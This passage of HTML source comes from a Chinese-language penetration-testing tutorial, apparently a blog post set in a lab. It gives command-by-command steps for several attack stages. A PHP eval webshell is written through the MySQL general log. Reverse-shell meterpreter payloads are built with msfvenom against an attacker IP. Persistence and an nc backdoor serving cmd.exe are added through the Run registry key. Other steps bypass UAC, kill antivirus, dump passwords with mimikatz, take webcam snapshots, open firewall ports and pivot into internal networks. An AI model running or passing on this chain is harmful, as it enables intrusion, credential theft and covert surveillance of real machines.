&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;general_log    &lt;span class=&#34;token keyword&#34;&gt;OFF&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;general_log_file    C:\phpStudy\PHPTutorial\MySQL\&lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt;\zhong&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;PC&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以看到为关闭状态&lt;/p&gt;
&lt;p&gt;为了通过日志获得 webshell，我们需要开启，同时为了使得日志能够被解析，将其日志文件命名为 php 文件，并放在网站根目录&lt;/p&gt;
&lt;p&gt;根目录可以通过 phpinfo.php 获知&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行以下 sql 语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;global&lt;/span&gt; general_log &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;on&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;global&lt;/span&gt; general_log_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\\phpStudy\\PHPTutorial\\www\\1.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;再执行&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; VARIABLES &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%general%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;返回&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;general_log  &lt;span class=&#34;token keyword&#34;&gt;ON&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;general_log_file   C:\phpStudy\PHPTutorial\www\&lt;span class=&#34;token number&#34;&gt;1.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后执行&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;访问日志文件&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguNDcuMTQwLzEucGhw&#34;&gt;http://192.168.47.140/1.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可以看到 php 报错，未设置  &lt;code&gt;1&lt;/code&gt;  的值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;蚁剑连接&lt;/p&gt;
&lt;h2 id=&#34;生成木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生成木马&#34;&gt;#&lt;/a&gt; 生成木马&lt;/h2&gt;
&lt;p&gt;打开 kali 机，利用 msfvenom 生成木马&lt;/p&gt;
&lt;p&gt;这里以 windows 机为例&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.47.129 &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt; x64 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;其中 &lt;code&gt;LHOST&lt;/code&gt;  为本地攻击机（即 kali）， &lt;code&gt;LPORT&lt;/code&gt;  为端口， &lt;code&gt;-a&lt;/code&gt;  为系统位数， &lt;code&gt;-f&lt;/code&gt;  生成文件类型&lt;/p&gt;
&lt;p&gt;32 位系统&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.47.129 &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt; x86 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行后会在当前目录下生成一个 4.exe 文件&lt;/p&gt;
&lt;h2 id=&#34;kali-监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kali-监听&#34;&gt;#&lt;/a&gt; kali 监听&lt;/h2&gt;
&lt;p&gt;kali 分别执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfconsole&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token comment&#34;&gt;# 如果位 x86 则去除 x64 目录&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.47.129 &lt;span class=&#34;token comment&#34;&gt;# 设置监听机&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run &lt;span class=&#34;token comment&#34;&gt;# 开始监听&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_4.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;上传并使用木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传并使用木马&#34;&gt;#&lt;/a&gt; 上传并使用木马&lt;/h2&gt;
&lt;p&gt;在蚁剑上传该木马到网站的根目录&lt;/p&gt;
&lt;p&gt;使用蚁剑的虚拟终端，输入 &lt;code&gt;4.exe&lt;/code&gt; , 运行上传的文件，可以看到 kali 机获得了命令窗口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_8.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_5.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;getuid&lt;/code&gt; ，可以看到为管理员权限，然后可以输入 &lt;code&gt;getsystem&lt;/code&gt;  获取系统权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_6.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用命令 &lt;code&gt;run persistence -S -U -X -i 5 -p 4444 -r 192.168.47.129&lt;/code&gt;  留后门，当目标机重启且 kali 攻击机开启监听时，会自动获取命令窗口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_7.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;37-渗透信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#37-渗透信息收集&#34;&gt;#&lt;/a&gt; 3.7 渗透信息收集&lt;/h1&gt;
&lt;h2 id=&#34;反弹连接木马获取-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反弹连接木马获取-shell&#34;&gt;#&lt;/a&gt; 反弹连接木马获取 shell&lt;/h2&gt;
&lt;p&gt;同上面 webshell 提权的获取 shell 方法，利用 msfvenom 生成一个木马并使目标机运行&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getuid&lt;/code&gt;  查看当前用户&lt;/p&gt;
&lt;p&gt;&lt;code&gt;net user&lt;/code&gt;  查看所有用户 (无法使用时，输入 shell 弹出 cmd 的窗口)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;net user 用户名&lt;/code&gt; 查看该用户在哪个用户组，有什么权限&lt;/p&gt;
&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
&lt;p&gt;-UAC (User Account Control 用户账户控制)&lt;/p&gt;
&lt;p&gt;要求用户在执行可能影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员密码&lt;/p&gt;
&lt;p&gt;-UAC 绕过提权&lt;/p&gt;
&lt;p&gt;Exploit/windows/local/ask&lt;/p&gt;
&lt;p&gt;// 高等级执行绕过 uac----- 需要用户确认&lt;/p&gt;
&lt;p&gt;use exploit/windows/local/bypassuac&lt;/p&gt;
&lt;p&gt;// 无弹窗的 uac 绕过&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;background # 将会话放到后台&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;session # 查看当前拥有会话&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;session -i 编号 # 进入指定编号的会话&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;（利用 ms17-010 永恒之蓝获取 system 权限）&lt;/p&gt;
&lt;h2 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h2&gt;
&lt;p&gt;Msf 下进行信息收集:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/forensics/enum_drives// 获取目标机器的分区情况&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/checkvm// 判断是否为虚拟机&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/enum_services// 开启哪些服务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/enum_applications// 安装了那些应用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/enum_shares// 查看共享&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/dumplinks.// 获取主机最近的系统操作&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/enum_applications// 查看补丁&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/manage/killav// 命令关闭目标机系统杀毒软件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/manage/enable_rdp// 命令启动目标机的远程桌面协议，也就是常说的 3389 端口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/mange/autoroute// 命令查看目标机的本地子网情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/enum_logged_on_users// 命令列举当前有多少用户登录了自标机”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run post/windows/gather/enum_applications// 命令列举安装在目标机上的应用程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;screenshot // 截图&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;webcam_list // 查看目标机是否有摄像头&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;webcam_snap // 打开目标摄像头，拍一张照片&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;webcam_stream // 开启直播模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;shll // 进入目标机的 shell 下面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;exit // 停止 meterpreter 会话&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件系统命令&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;pwd 或 getwd // 查看当前处于的目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getlwd // 查看&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ls&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cd&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;search -f *.txt -d c:\ // 搜索 c 盘下所有以 &#39;.txt&#39; 为后缀的文件，-f 用于指定搜索文件模式，-d 用于指定在哪个目录下进行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hash 破解登陆密码（mimikatz 现在改为 kimi，使用命令也有所不同，具体见 help)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; load mimikatz // 启动 mimikatz 模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; help // 查看帮助&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; msv // 获取登录密码的 hash 值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; mimikatz_command -f samdump::hashes // 获取登录密码的 hash 值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; ssp // 获取的是明文信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; tspkg // 获取的是明文信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; wdigest // 读取内存中存放的账号密码明文信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;meterpreter &amp;gt; kerberos // 获取明文密码&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;或者运行以下脚本&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;run Scraper&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run Winenum&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;获取常用的信息&lt;/p&gt;
&lt;h1 id=&#34;38-nc-后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#38-nc-后门&#34;&gt;#&lt;/a&gt; 3.8 NC 后门&lt;/h1&gt;
&lt;h2 id=&#34;ms17-010-获取系统权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ms17-010-获取系统权限&#34;&gt;#&lt;/a&gt; ms17-010 获取系统权限&lt;/h2&gt;
&lt;h2 id=&#34;nc-后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nc-后门&#34;&gt;#&lt;/a&gt; Nc 后门&lt;/h2&gt;
&lt;h3 id=&#34;上传-nc-后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传-nc-后门&#34;&gt;#&lt;/a&gt; 上传 nc 后门&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;upload /root/nc.exe c:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;windows&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;system32&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;修改注册表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改注册表&#34;&gt;#&lt;/a&gt; 修改注册表&lt;/h3&gt;
&lt;p&gt;+reg enumkey -k HKLM\software\microsoft\windows\currentversion\run // 查看键值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe&#39;&lt;/code&gt; // 添加 nc 键值&lt;/p&gt;
&lt;p&gt;-k 为注册表路径 -v 为进程名 -d 后为启动程序所在位置 4444 为服务端口号 -e 返回内容（cmd.exe 返回系统的交互窗口）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc&lt;/code&gt; // 查看&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;重启，可以发现防火墙阻止了网络功能，这里需要关闭防火墙或者通过之前获得权限，将端口写入到防火墙中允许的端口中&lt;/p&gt;
&lt;h3 id=&#34;防火墙允许端口添加时防火墙应处于关闭状态&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防火墙允许端口添加时防火墙应处于关闭状态&#34;&gt;#&lt;/a&gt; 防火墙，允许端口（添加时，防火墙应处于关闭状态）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;execute -f cmd -i -H // 生成 shell (或者输入 shell)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cmd：netsh firewall show opmode // 查看防火墙状态&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;netsh firewall add portopening TCP 444 &#34;textx&#34; ENABLE ALL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;netsh firewall add portopening TCP 4444 &#34;FireWall&#34; ENABLE ALL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;netsh firewall add portopening TCP 7776 &#34;QQ&#34; ENABLE ALL&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;39-内网转发穿透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#39-内网转发穿透&#34;&gt;#&lt;/a&gt; 3.9 内网转发穿透&lt;/h1&gt;
&lt;h2 id=&#34;获取内网服务器的-session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取内网服务器的-session&#34;&gt;#&lt;/a&gt; 获取内网服务器的 session&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;配置 frp 穿透：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==&#34;&gt;https://github.com/fatedier/frp&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;端口映射，假设靶机 4444 端口映射到公网的 6002 端口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用木马反弹 session&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=g 公网 ip LPORT=6002 (即转发到的公网端口) -f exe &amp;gt;test.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;生成一个 test.exe 木马&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择模块监听&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set lhost 攻击机 ip&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set lport 4444 攻击机监听端口&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;内网代理转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网代理转发&#34;&gt;#&lt;/a&gt; 内网代理转发&lt;/h2&gt;
&lt;h3 id=&#34;内网探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网探测&#34;&gt;#&lt;/a&gt; 内网探测&lt;/h3&gt;
&lt;p&gt;msf 中，获取到一台机子的 session 后 (该机子可以访问内网的机器)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;run post/windows/gather/arp_scanner rhost = 内网 ip（如 192.168.1.0/24） 扫描内网中的 (192.168.1.0) 网段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run post/multi/manage/autoroute// 自动添加路由&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run autoroute -s 192.168.2.1/24 // 添加 192.168.2.1/24 的路由&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run autoroute -p // 查看路由条目&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;但此时 nmap 扫描无法扫出，需要使用 socks 代理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同样的 msf 中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;use auxiliary/sever/socks4a// 设置 socks 代理服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set SRVHOST ip&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set SRVPORT port&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置 proxychains 代理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;vim /etc/proxychains.conf&lt;/p&gt;
&lt;p&gt;设置 socks4 之前设置的 socks 的 ip 设置的端口&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 proxychains&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;proxychains nmap -sT -sV --script=vuln 目标内网机 ip&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
